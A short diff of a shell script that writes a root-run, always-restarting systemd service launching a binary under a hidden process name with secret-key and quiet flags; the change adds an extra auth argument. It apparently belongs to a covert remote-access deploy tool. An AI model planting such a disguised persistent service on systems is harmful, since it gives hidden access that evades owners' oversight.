@@ -1041,7 +1041,7 @@ Type=simple
 Restart=always
 RestartSec=300
 WorkingDirectory=/root
-ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
+ExecStart=/bin/bash -c \"${ENV_LINE[*]}GS_ARGS='-k $SYSTEMD_SEC_FILE -ilq${GS_AUTH_EXTRA//\'/}' exec -a '${PROC_HIDDEN_NAME}' '${DSTBIN}'\"
 
 [Install]
 WantedBy=multi-user.target" >"${SERVICE_FILE}" || return
